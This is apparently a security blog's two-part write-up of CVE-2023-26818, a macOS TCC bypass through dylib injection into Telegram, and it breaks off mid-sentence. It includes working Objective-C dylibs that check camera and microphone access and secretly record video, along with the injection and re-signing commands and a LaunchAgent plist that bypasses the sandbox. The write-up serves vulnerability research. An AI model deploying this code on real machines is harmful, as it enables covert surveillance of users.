com.apple.security.cs.disable-library-validation is one of the Entitlements that   controls whether library validation is enabled or disabled for the application, Which is a security feature in MacOS that   checks and validates the code signature of DyLib loaded by an application. As a result, It avoids loading a non-   signed/verified DyLib which could be maliciouis. Here we can see that the DyLib validation is turned off. Then, We can load   a malicious DyLib Into the app. Now, How that could happen? Well, there are many ways that the apps normally used in   loading DyLib as the following:           Dyld Environment Variable: An application can specify a list of directories in the DYLD_INSERT_LIBRARIES environment            variable where the dynamic linker (dyld) should search for DyLibs. If this variable is set, dyld will look in these            directories when resolving library dependencies.            RPATH: An application can specify a runtime search path (RPATH) inside the binary, which tells dyld where to search            for DyLibs. This path is encoded in the executable file and is used during runtime to locate required libraries.            Frameworks: MacOS applications can use frameworks, which are bundles of shared libraries, headers, and other resources. Frameworks are a convenient way to package and load libraries, and they are commonly used by MacOS app developers.            Bundles and Plug-ins: An application can load DyLibs from separate bundles or plug-ins that are loaded at runtime. Bundles and plug-ins are essentially separate packages containing code and resources that the application can load as needed.            Mach-O Dynamic Linker API: An application can use the Mach-O dynamic linker API to explicitly load and link dylibs at            runtime. This allows the application to control the loading and unloading of libraries programmatically.            NSAddImage(): On MacOS, Objective-C applications can use the NSAddImage() function to dynamically load a DyLibs at            runtime. This function allows the application to load a library and use the symbols defined in it.            dlopen() and dlsym(): Applications can use the standard C library functions dlopen() and dlsym() to load and access symbols from DyLibs at runtime. These functions are commonly used in dynamic loading scenarios.       Is it only vulnerable when it has this Entitlement ? No, and There are other cases as the following:           When the app is not defined as Hardened Runtime.            When the app has com.apple.security.cs.disable-library-validation in the Entitlements.            When the app has com.apple.security.cs.allow-dyld-environment-variables in the Entitlements.       Our main focus now is to exploit DyLib Injection through Dyld Environment Variable, We can do this easily by setting   the DYLD_INSERT_LIBRARIES environment variable. To inject our DyLib we need to write our own malicious one to use and this   can be done using Objective-C, Which is primarily used in development for OSX and IOS. In other words, Apple products.   back in the time, It was developed by NeXT for the NeXTSTEP OS before Apple takes it. the language is a superset   of C language. We won’t cover the basics of Objective-C, But, We will be explaining the code parts:   #import &lt;Foundation/Foundation.h&gt;  __attribute__((constructor)) static void telegram(int argc, const char **argv) { NSLog(@\"[+] Dynamic library loaded into %s\", argv[0]); }   First, We Imported the Foundation framework which provides fundamental classes and functionality similar to stdio.h library   in C language. Then, __attribute__((constructor)) which is a compiler attribute, When applied to a function, It indicates that   the function should be executed automatically when the DyLib is loaded. After that, we declared a static function   named telegram Inside it, we can see NSLog(@\"[+] Dynamic library loaded into %s\", argv[0]); which prints a massage followed by   the value of the first element of the argv array which represents the path to the executable of the app that loaded   the DyLib. Now, Let’s save our code in a file named teleDyLib.m:      After that, we will be compiling our code using gcc normally using the following:   gcc -framework Foundation -dynamiclib teleDyLib.m -o tele.dylib   Here we specified the framework we wanna use -framework argument, Along with -dynamiclib argument to compile our code as   a DyLib.      Here we see our DyLib ready. Now, Let’s perform our DyLib Injection to test it:   DYLD_INSERT_LIBRARIES=tele.dylib /Applications/Telegram.app/Contents/MacOS/Telegram      Here we can see in the screenshot the highlighted spot, Where the output shows that the library Injected and loaded   successfully. Let’s Take a look at it dynamically while Telegram loading our library using opensnoop tool.   Basically, opensnoop tracks file opens. As a process issues a file open, details such as UID, PID and pathname are printed   out.:   sudo opensnoop -n Telegram -a   Here we defined the process to trace by name using -n and -a is used to print all data.      Here we can see clearly the loaded files by Telegram app which includes our library (Highlighted in the screenshot) including   library path and other information as the following:   - ZONE: Zone name.   - UID: User ID.   - PID: Process ID.   - PPID: Parent Process ID.   - FD: File Descriptor (-1 is error).   - ERR: errno value (see /usr/include/sys/errno.h).   - CWD: current working directory of the process.   - PATH: pathname for file open.   - COMM: command name for the process.   - ARGS: argument listing for the process.   - TIME: timestamp for the open event, us.   - STRTIME: timestamp for the open event, string.   Now, How that could be exploited or what impact could that cause? Basically, We are going to bypass TCC and get access to the   same Entitlements as Telegram app, Since our code is loaded within the app then we will act based on Telegram permissions   and has access to the same things as the following:           com.apple.security.device.audio-input: This key grants the application access to audio input devices, such as the            microphone. Setting this value to true allows the application to access the audio input device (microphone). which enables            the application to record audio.            com.apple.security.device.camera: This key grants the application access to the camera. Setting this value to true allows            the application to access the device’s camera. which enables the application to capture images or record video using the camera.            com.apple.security.personal-information.location: This key grants the application access to the user’s location information.            Setting this value to true allows the application to access the user’s location information. It enables the application to            retrieve the device’s current location using GPS or other location services.       And the same goes for the other Entitlements. Now it’s the time to start exploiting this and showcase for each one of   the Entitlement. Before we start we will need to use the launch agent to bypass the restrictions. But fIRST Let’s see what   will happen if we Injected the following DyLib:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;  @interface CameraAccessChecker : NSObject  + (BOOL)hasCameraAccess;  @end  @implementation CameraAccessChecker  + (BOOL)hasCameraAccess {     AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];     if (status == AVAuthorizationStatusAuthorized) {         NSLog(@\"[+] Access to camera granted.\");         return YES;     } else {         NSLog(@\"[-] Access to camera denied.\");         return NO;     } }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     [CameraAccessChecker hasCameraAccess]; }   So, This DyLib will check if we have access to the camera or not. Let’s explain the code.   #import &lt;Foundation/Foundation.h&gt;  #import &lt;AVFoundation/AVFoundation.h&gt;   Here we imported the required frameworks. Foundation provides fundamental classes and data types, while AVFoundation providing   classes for working with audio and video.   @interface CameraAccessChecker : NSObject  + (BOOL)hasCameraAccess;  @end   In this part, we defined the interface of the CameraAccessChecker class which is a subclass of NSObject and the interface   contains a single class method + (BOOL)hasCameraAccess;. Then, marks the end of the class interface.   @implementation CameraAccessChecker  + (BOOL)hasCameraAccess {     AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];     if (status == AVAuthorizationStatusAuthorized) {         NSLog(@\"[+] Access to camera granted.\");         return YES;     } else {         NSLog(@\"[-] Access to camera denied.\");         return NO;     } }  @end   Here we start the implementation of the CameraAccessChecker class. Then, define the class method hasCameraAccess which returns   a boolean value (BOOL) indicating whether the app has access to the camera or not. After that,   AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];: it retrieves the current   authorization status for accessing the camera using the AVCaptureDevice class. Following the   method authorizationStatusForMediaType is used to check the authorization status for a specific media type, which in this case   is video (AVMediaTypeVideo). Then, It checks if the authorization status is AVAuthorizationStatusAuthorized which means the app   has been granted access to the camera. If it has access then it will print [+] Access to camera granted. if not then it will   print [-] Access to camera denied.. Now, It’s the time to compile our DyLib and try it out:      Here we saved our code in CamTest.m.   gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib      Our DyLib is ready, Let’s Inject it into Telegram:   DYLD_INSERT_LIBRARIES=CamTest.dylib /Applications/Telegram.app/Contents/MacOS/Telegram      As we can see we can access the camera as Telegram has access to it. The same goes for the microphone:   Microphone code:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;  @interface MicrophoneAccessChecker : NSObject  + (BOOL)hasMicrophoneAccess;  @end  @implementation MicrophoneAccessChecker  + (BOOL)hasMicrophoneAccess {     AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];     if (status == AVAuthorizationStatusAuthorized) {         NSLog(@\"[+] Access to microphone granted.\");         return YES;     } else {         NSLog(@\"[-] Access to microphone denied.\");         return NO;     } }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     [MicrophoneAccessChecker hasMicrophoneAccess]; }   Microphone Compile:   gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib   Microphone Test:   ![](/assets/images/89b0b7f7ecbe1f8c26b1c297e38457dd)  &amp;nbsp;   Exploitation   Now, It’s the time for exploitation. The following code will let us access the camera and record a video for 3 seconds:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;  @interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;  - (void)startRecording; - (void)stopRecording;  @end  @implementation VideoRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }  - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];     NSError *error;     self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up video device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.videoDeviceInput]) {         [self.captureSession addInput:self.videoDeviceInput];     }      self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.movieFileOutput]) {         [self.captureSession addOutput:self.movieFileOutput];     } }  - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.mov\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }  - (void)stopRecording {     [self.movieFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }  #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     } }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];      [videoRecorder startRecording];     [NSThread sleepForTimeInterval:3.0];     [videoRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Let’s explain the code by part by part:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;   The Foundation framework provides basic classes and data types, while AVFoundation providing classes for working with audio   and video.   @interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;  - (void)startRecording; - (void)stopRecording;  @end   This interface declares a class called VideoRecorder that conforms to the AVCaptureFileOutputRecordingDelegate protocol. It   defines properties for the AVCaptureSession (used to coordinate video capture), AVCaptureDeviceInput (used to represent the   device’s camera as an input source), and AVCaptureMovieFileOutput (used to write the captured video to a file).   @implementation VideoRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }   Here is the initializer for the VideoRecorder class. When an instance VideoRecorder is created, it automatically calls   the setupCaptureSession method to set up the video capture session.   - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];     NSError *error;     self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up video device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.videoDeviceInput]) {         [self.captureSession addInput:self.videoDeviceInput];     }      self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.movieFileOutput]) {         [self.captureSession addOutput:self.movieFileOutput];     } }   In this method, we set up AVCaptureSession and configures it to use the device’s default video capture device (camera). It   checks for errors during device input configuration and adds the video device input and movie file output to the capture   session if possible.   - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.mov\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }  - (void)stopRecording {     [self.movieFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }   The startRecording method starts AVCaptureSession and begins recording video to a file with the specified output file URL.   The stopRecording the method stops the recording and the AVCaptureSession.   #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     } }   This delegate method is called when the recording is finished. It checks for any error and logs the result accordingly.   __attribute__((constructor)) static void telegram(int argc, const char **argv) {     VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];      [videoRecorder startRecording];     [NSThread sleepForTimeInterval:3.0];     [videoRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Finally, This function is marked with the __attribute__((constructor)) attribute which makes it a constructor function. It is   automatically called before the main function of the program starts running and inside it a new instance of   the VideoRecorder class is created and then video recording is started and stopped with a 3 seconds delay between   the start and stop calls. Now, Let’s Save our code into a file and name it Camexploit.m:      Compiling and testing time:   gcc -dynamiclib -framework Foundation -framework AVFoundation Camexploit.m -o Cam.dylib      Here we can see it recorded successfully and saved into /var/folders/vd/0qrj318n3jz1b78pwxcyxjjm0000gn/T/recording.mov. The Mac I   am using is Mac-Mini M2 CHIP. In other versions of telegram it may output that the terminal wants to access the camera.   Because of sandbox restrictions. In this case, we are going to use Launch Agent it to bypass it. In the next part.   Patch Diffing      Here is the patch diffing between the version we worked on and the last version. Is that we can easily see that in   the Entitlements the team removed com.apple.security.cs.disable-library-validation, So the app check the signature of the   library before loading it. and added new Entitlements for read/write and others (Like enabling sandboxing). Finally, The app   the last version is Hardened Runtime so the app will prevent the DyLib Injection as we can see in the following screenshot:      Conclusion   In this analysis, We understood a lot of terms and technology that are used with-in MacOS such as   Code Signing, Entitlements, Hardend Runtime and many more. We detailed the vulnerability, Why does it happen, How   the DyLib The injection works &amp; The cases that the app can be vulnerable to it. Finally, We show how an attacker can use this   vulnerability to bypass TCC and Record a video and It can be exploited with anything Telegram has access to.   Resources           https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1            https://developer.apple.com/documentation/security/hardened_runtime            https://developer.apple.com/documentation/security/code_signing_services            https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_location_push            https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_authentication-services_autofill-credential-provider            https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/AboutEntitlements.html            https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html            https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/            https://ofiralmkias.medium.com/bypassing-macos-sandbox-performing-privilege-escalation-and-more-2a020efd7ceb            https://support.apple.com/en-my/guide/terminal/apdc6c1077b-5d5d-4d35-9c19-60f2397b2369/mac            https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/      ","categories": ["MacOS"],
        "tags": [],
        "url": "http://localhost:5000/macos/CVE_2023_26818_P1/",
        "teaser": "http://localhost:5000/assets/images/clkwqgj552ieo1jn98ipq6usu.png"
      },{
        "title": "CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection",
        "excerpt":"Introduction   In the previous part we discuss the root-cause of the vulnerability and show case on how it works and how to exploit it. But,   in the previous part the sandbox was disabled. Now, In this part 2 we are going to discuss the sandboxing on the MacOS and   How to bypass it in details. If you didn’t read part 1 you can find it from here.       App sandboxing   The app sandboxing feature in MacOS is a technology that the system enforce at the kernel’s level which limit privileges and   restrict the app access to resources/permissions. As a results, It helps in reducing the attacks and the infection of   compromised apps to the system. The first introduce for the sandboxing by apple was in 2007 &amp; Enforced to be used by apps   before adding it to the app store in 2011, So it make sure that the apps more secure to use by making the app run in it’s own   area and do nothing more except what is created for.                  But, Why It’s important?. Because, any non-sandboxed app has the full rights of the user who is running that app, and can   access any resources that the user can access. If that app or the frameworks it is linked against contain security holes, an   attacker can potentially exploit those holes to take control of that app, and in doing so, the attacker gains the ability to   do anything that the user can do on the system. So, Sandboxing the app helps to limit the infection of compromise and the   attack surface for the malicious actor. So, To go more deeper how does the sandbox works and/or implemented ?. When the app   is sandboxed it’s defined in the Entitlements which we discussed in the first part. The Entitlement of the sandbox is   com.apple.security.app-sandbox. The app sandbox has elements and these elements are container directories, entitlements,   user-determined permissions, privilege separation, and kernel enforcement. Each App Sandboxed runs under a container created at   ~/Library/Containers/ under this path, you can find each sandboxed app with its CFBundleIdentifier as a folder and this   folder contains a plist file and a Sandbox profile data file that contains the configuration of the sandboxed app like it’s   Entitlements. When you apply sandboxing to your app, On the first launch of your app MacOS Creates a special directory   under the user that using it specifically the home directory in the ~/Library/Containers/ and the app has unfettered   read/write access to the container for the user who ran it. Now, The question is how the app integrates with the system when needed.                  Well, Let’s take the Open &amp; Save permissions as an example and suppose that the app wants to open and save something into   any directory, What will happen is that the app will interact with the Powerbox API which is an internal part of MacOS and   mainly associated with the sandboxing mechanism which is responsible for allowing sandboxed applications to request access to   specific user files or resources without giving the application unrestricted access to the entire filesystem. And for more   clearness it works as the following: Let’s say a sandboxed app wants to open a user file. The app cannot directly access the   filesystem due to its sandbox restrictions, The app will present a file dialog to the user (like NSOpenPanel or NSSavePanel   in MacOS). When the user uses this dialog to select a file, they’re indirectly interacting with Powerbox and Once the user   selects a file Powerbox grants the app a token (or an exception to its sandbox) to access only that specific file. After   that the app doesn’t get unrestricted access to the whole filesystem but just the user-selected file. Finally, With the   user’s explicit permission through the Powerbox system, sandboxed apps can also retain access to specific resources across   launches using “security-scoped bookmarks.” for example, a sandboxed text editor to save changes back to a file that a user   has previously opened. So, In general the sandboxing feature in MacOS limit the following types of operations: File read,   write, with many different granular operations, IPC Posix and SysV, Mach, Network as inbound &amp; outbound, Process   execution &amp; fork, Signals, Sysctl and System. When an application is sandboxed and gets started it first calls   sandbox_init which will place the process into a sandbox using one of the pre-defined profiles. What are the profiles?   The sandbox profiles are the set of rules which how the app behaves. example on the sandbox profiles:                          kSBXProfileNoInternet: TCP/IP networking is prohibited.                    kSBXProfileNoNetwork: All sockets-based networking is prohibited.                    kSBXProfileNoWrite: File system writes are prohibited.                    kSBXProfileNoWriteExceptTemporary: File system writes are restricted to the temporary folder /var/tmp and the folder               specified by theconfstr(3) configuration variable _CS_DARWIN_USER_TEMP_DIR.                    kSBXProfilePureComputation: All operating system services are prohibited.       Now, We have the basic knowledge about the app sandboxing, how it works and some of its components. Let’s move further.           Launch Agent and Bypass the sandbox   Now we come to bypass the sandbox but before we do tho we need to understand what is the launchd and launch agent.   Launched is a unified service-management framework initialy relased in 2005 which is responsible for starting, stopping, and   managing daemons (daemons are the background process), applications, processes, and scripts, both at system startup and   during the regular operation of the system. But, What does unified framework means ?, It means that Launched replaces   several other Unix based service-management utilities and scripts that were traditionally used in older versions of macOS   such as init, rc, StartupItems, inetd, xinetd, cron, and at. There is more than one type for the background processes   (daemons), So the user can choose the one that fits its own requirements, considering the following:           Whether it does something for the currently logged in user or for all users.                    Whether it will be used by a single application or by multiple applications.                    Whether it ever needs to display a user interface or launch a GUI application.           the background processes (daemons) has many types as the following:                  Each type is used for a spasific job and run in different context. But, the one we are intreasted in is Launch Agent, We   discussed the Launch Agent before in the first part and we gonna talk about it again:   A Launch Agent in MacOS is a tool designed for managing, scheduling, and executing background tasks. Part of the broader   Launchd system, this mechanism takes charge of initiating, halting, and overseeing processes during different phases of the   system’s operation and startup. Configuration files situated in specific folders guide the operation of daemons and agents   managed by launchd. While these agents are supervised by launchd, their operations cater to the requirements of the   currently active user, implying they function within the user context. Such agents possess the capability to engage in   communication with other processes present in the identical user session, as well as with universal daemons in the   overarching system context. Even though they have the capacity to exhibit a visual interface, it’s typically discouraged. For   developers offering both services exclusive to users and those that aren’t, the dual incorporation of a daemon and an agent   is a viable strategy. In such setups, the daemon, operating within the system context, extends the non-user-specific   services. Concurrently, for each active user session, an instance of the agent is launched. These agents then collaborate   with the daemon, ensuring seamless service provision to every user. The following are the directories of the Launch Agents:                  When talking about launchd, there are two primary session contexts to be aware of:                          Startup Session:                               This is the session context that starts when the system boots up, even before any user logs in. Daemons that run within                       the startup session context has system-wide permissions. They operate in the background, not associated with any                       specific user, and generally provide services that need to be available from the moment the system starts. These                       daemons run without any user interface, and they don’t have access to user-specific services or data unless they                       explicitly request and are granted such access. The configuration files for these daemons are usually found in /Library/LaunchDaemons/ and /System/Library/LaunchDaemons/.                                Login Session:                               This session starts when a user logs into the system. Each user who logs in gets their own login session. Agents run                       within this context operate on behalf of the logged-in user and can access user-specific services, data, and even GUI                       elements if necessary. However, as they run with the permissions of the logged-in user, which means they can’t                       typically perform system-wide operations unless the user has elevated privileges. The configuration files for these                       agents can be found in ~/Library/LaunchAgents/ for user-specific agents and /Library/LaunchAgents/ for agents that                       should be available to any user who logs in, but still run in the context of the logged-in user.                       Now, Let’s see how is the startup for each session is done:           After the system is booted and the kernel is running, launchd is run to finish the system initialization. As part of that               initialization, it goes through the following steps:                       It loads the parameters for each launch-on-demand system-level daemon from the property list files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/.                                    It registers the sockets and file descriptors requested by those daemons.                                    It launches any daemons that requested to be running all the time.                                    As requests for a particular service arrive, it launches the corresponding daemon and passes the request to it.                                    When the system shuts down, it sends a SIGTERM signal to all of the daemons that it started.                                The process for per-user agents is similar. When a user logs in, a per-user launchd is started. It does the following:                               It loads the parameters for each launch-on-demand user agent from the property list files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and the user’s individual ~/Library/LaunchAgents directory.                                    It registers the sockets and file descriptors requested by those user agents.                                    It launches any user agents that requested to be running all the time.                                    As requests for a particular service arrive, it launches the corresponding user agent and passes the request to it.                                    When the user logs out, it sends a SIGTERM signal to all of the user agents that it started.                       Creating a Launch Agent   When creating a Launch Agent we configure it in Property List(plist) file in XML format. The property list file is   structured the same for both daemons and agents. You indicate whether it describes a daemon or agent by the directory you   place it in. Property list files describing daemons are installed in /Library/LaunchDaemons, and those describing agents are   installed in /Library/LaunchAgents or in the LaunchAgents subdirectory of an individual user’s Library directory. The   needed keys in the plist file as the following:                  We can see in the above picture each key and its description. Now, an example of the agent:   &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;dict&gt;     &lt;key&gt;Label&lt;/key&gt;     &lt;string&gt;com.example.hello&lt;/string&gt;     &lt;key&gt;ProgramArguments&lt;/key&gt;     &lt;array&gt;         &lt;string&gt;hello&lt;/string&gt;         &lt;string&gt;world&lt;/string&gt;     &lt;/array&gt;     &lt;key&gt;KeepAlive&lt;/key&gt;     &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt;       Let’s explain this example plist file:       &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;       This portion indicates that the file is an XML document and specifies the version of XML being used. The DOCTYPE   declaration defines the document type and references a DTD (Document Type Definition) from Apple which sets rules for the   plist file structure.       &lt;plist version=\"1.0\"&gt; &lt;dict&gt;       These tags indicate the start of the plist content and a dictionary data structure. The dictionary will contain key-value   pairs that define the properties and settings of the launch agent.       &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.example.hello&lt;/string&gt;       This key-value pair assigns a unique identifier to the launch agent. This label, com.example.hello, is used by launchctl   (the command-line interface to launchd) to reference the agent for tasks like loading or unloading it.       &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt;     &lt;string&gt;hello&lt;/string&gt;     &lt;string&gt;world&lt;/string&gt; &lt;/array&gt;       This key specifies the program to be executed along with its arguments. In this case, the program named hello will be run   with the argument world. The path to the hello program is not specified here, so it would need to be in a location   recognized by the system’s PATH or the full path should be provided.       &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt;       This key-value pair indicates that the program should be kept running indefinitely. If the program exits for any reason,   launchd will restart it. The value &lt;true/&gt; means that the KeepAlive feature is enabled.       &lt;/dict&gt; &lt;/plist&gt;       These mark the end of the dictionary data structure and the end of the plist content.       Sandbox Bypass   After going through dozens of resources non-mentioned the root-cause or the reason why the launch agent can bypass the   sandbox. But, I found 2 reasons that are closer to being true and one of them makes more sense:               When the app runs through launchd then it’s managed by launchd and works under it, As a result, it bypasses the sandbox.                    When a malicious code such as a DyLib gets loaded with the program in the agent, It leads the library to act the same way               as the program. Then it will be able to obtain the same permissions as the running app which makes it bypass the sandbox.           I see the second reason as more logical. Because launchd implementation has these thoughts to make sure the app is running as it   has to. Now, After we made almost everything clear, We can start to exploit the CVE-2023-26818 while the sandbox is   activated.       Exploitation   What we need now is to reassign the Entitlements to telegram and set the sandbox to true, In the first part, we explained   how to do tho, but we will show it again with the changes (Only the signing part). The following are the Entitlements we   need:   &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;dict&gt;     &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.application-groups&lt;/key&gt;     &lt;array&gt;         &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram&lt;/string&gt;         &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&lt;/string&gt;     &lt;/array&gt;     &lt;key&gt;com.apple.security.cs.allow-dyld-environment-variables&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;     &lt;true/&gt;     &lt;key&gt;com.apple.security.personal-information.location&lt;/key&gt;     &lt;true/&gt; &lt;/dict&gt; &lt;/plist&gt;       Let’s remove telegram app signing:   codesign --remove-signature --no-strict /Applications/Telegram.app       Now, Let’s sign it using our Entitlements:   codesign --force --deep --sign \"Developer ID\" --entitlements entit.plist /Applications/Telegram.app       Finally, Let’s take a look at the signing information:   codesign -dv --entitlements - /Applications/Telegram.app                  We can see clearly that the sandbox is activated and if we open the activity monitor app we can see it clearly as the following:              Now, Oppiste to the exploitation way we did in the first part without the sandbox, We are going to use the Launch Agent to   do tho, So we can bypass the sandbox. Here is the agent plist:   &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;dict&gt;        &lt;key&gt;Label&lt;/key&gt;         &lt;string&gt;com.telegram.launcher&lt;/string&gt;         &lt;key&gt;RunAtLoad&lt;/key&gt;         &lt;true/&gt;         &lt;key&gt;EnvironmentVariables&lt;/key&gt;         &lt;dict&gt;           &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;           &lt;string&gt;/Users/labatrixteam/telegram/Camexploit.dylib&lt;/string&gt;         &lt;/dict&gt;         &lt;key&gt;ProgramArguments&lt;/key&gt;         &lt;array&gt;   &lt;string&gt;/Applications/Telegram.app/Contents/MacOS/Telegram&lt;/string&gt;         &lt;/array&gt;         &lt;key&gt;StandardOutPath&lt;/key&gt;         &lt;string&gt;/tmp/telegram.log&lt;/string&gt;         &lt;key&gt;StandardErrorPath&lt;/key&gt;         &lt;string&gt;/tmp/telegram.log&lt;/string&gt; &lt;/dict&gt; &lt;/plist&gt;       The explanation for the essential keys is as we explained before in the previous example, But we gonna explain the simple   differences:   &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt;       Specifies that the program associated with this agent should be executed as soon as the agent is loaded.   &lt;key&gt;EnvironmentVariables&lt;/key&gt; &lt;dict&gt;     &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;     &lt;string&gt;/Users/labatrixteam/telegram/Camexploit.dylib&lt;/string&gt; &lt;/dict&gt;       This section sets an environment variable DYLD_INSERT_LIBRARIES for the agent which specific environment variable for   dynamic libraries to be loaded before any others which instructs the system to load the   /Users/labatrixteam/telegram/Camexploit.dylib library when launching Telegram.   &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt;     &lt;string&gt;/Applications/Telegram.app/Contents/MacOS/Telegram&lt;/string&gt; &lt;/array&gt;       it’s set to run the main executable for the 